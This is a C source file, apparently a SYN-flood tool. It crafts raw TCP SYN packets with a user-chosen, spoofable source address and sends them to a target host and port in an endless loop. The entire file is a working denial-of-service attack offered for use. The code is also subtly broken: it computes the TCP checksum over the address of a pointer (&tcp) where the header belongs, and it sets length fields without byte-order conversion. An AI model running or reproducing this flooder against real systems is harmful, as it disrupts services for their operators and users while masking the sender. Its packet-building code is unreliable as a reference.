#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <errno.h>
#include <unistd.h>
#include <netdb.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>

#define TRUE 1

unsigned short in_cksum(unsigned short *addr, int len);

struct pseudo_header{
	unsigned int source_address;
	unsigned int dest_address;
	unsigned char place_holder;
	unsigned char protocol;
	unsigned short length;
};

int main(int argc, char **argv){

	int sock_fd, on = 1;
	struct sockaddr_in target;
	struct hostent *sourceAddr, *destAddr;
	struct iphdr *ip;
	struct tcphdr *tcp;
	struct pseudo_header pseudoHdr;
	char sendbuf[sizeof(struct iphdr) + sizeof(struct tcphdr)], *pseudoPacket;

	if(argc != 5){
		fprintf(stderr, "Usage: %s <source address> <source port> <target address> <target port>\n", argv[0]);
		exit(1);
	}

	if((sock_fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1){
		fprintf(stderr, "%s\n", strerror(errno));
		exit(4);
	}

	if(setsockopt(sock_fd, IPPROTO_IP, IP_HDRINCL, &on, sizeof(on)) == -1){
		fprintf(stderr, "%s\n", strerror(errno));
		exit(5);
	}
	setuid(getuid());

	ip = (struct iphdr *)sendbuf;
	tcp = (struct tcphdr *)(sendbuf + sizeof(struct iphdr));

	ip->ihl = 5;
	ip->version = 4;
	ip->tos = 0;
	ip->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
	ip->id = getuid();
	ip->frag_off = 0;
	ip->ttl = 255;
	ip->protocol = IPPROTO_TCP;
	ip->check = 0;
	ip->check = in_cksum((unsigned short *)ip, sizeof(struct iphdr));

	if((sourceAddr = gethostbyname(argv[1])) == NULL){
		fprintf(stderr, "%s\n", strerror(errno));
		exit(2);
	}
	ip->saddr = *(unsigned long *)sourceAddr->h_addr;

	if((destAddr = gethostbyname(argv[3])) == NULL){
		fprintf(stderr, "%s\n", strerror(errno));
		exit(3);
	}
	ip->daddr = *(unsigned long *)destAddr->h_addr;

	tcp->source = htons(atoi(argv[2]));
	tcp->dest = htons(atoi(argv[4]));
	tcp->seq = 0;
	tcp->ack_seq = 0;
	tcp->doff = 5;
	tcp->urg = 0;
	tcp->ack = 0;
	tcp->psh = 0;
	tcp->rst = 0;
	tcp->syn = 1;
	tcp->fin = 0;
	tcp->window = htons(5840); /* Maximum allowed window size */
	tcp->check = 0;
	tcp->urg_ptr = 0;

	pseudoHdr.source_address = ip->saddr;
	pseudoHdr.dest_address = ip->daddr;
	pseudoHdr.place_holder = 0;
	pseudoHdr.protocol = IPPROTO_TCP;
	pseudoHdr.length = sizeof(struct tcphdr);

	if((pseudoPacket = malloc(sizeof(struct pseudo_header) + sizeof(struct tcphdr))) == NULL){
		fprintf(stderr, "%s\n", strerror(errno));
		exit(6);
	}
	memcpy(pseudoPacket, &pseudoHdr, sizeof(struct pseudo_header));
	memcpy(pseudoPacket + sizeof(struct pseudo_header), &tcp, sizeof(struct tcphdr));

	tcp->check = in_cksum((unsigned short *)pseudoPacket, sizeof(struct pseudo_header) + sizeof(struct tcphdr));

	memset(&target, 0, sizeof(target));
	target.sin_family = AF_INET;
	target.sin_addr = *(struct in_addr *)destAddr->h_addr;
	target.sin_port = htons(atoi(argv[4]));

	while(TRUE){
			if(sendto(sock_fd, sendbuf, sizeof(struct iphdr) + sizeof(struct tcphdr), 0, (struct sockaddr *)&target, sizeof(target)) == -1){
			fprintf(stderr, "%s\n", strerror(errno));
			exit(7);
		}
	}

	return 0;
}

unsigned short in_cksum(unsigned short *addr, int len){

	unsigned short result;
	unsigned int sum = 0;

	while(len> 1){
		sum += *addr++;
		len -= 2 ;
	}

	if (len == 1)
		sum += *(unsigned char*)addr;
		
	sum = (sum >> 16) + (sum & 0xffff);
	sum += (sum >> 16);
	result = ~sum;
	return result;
}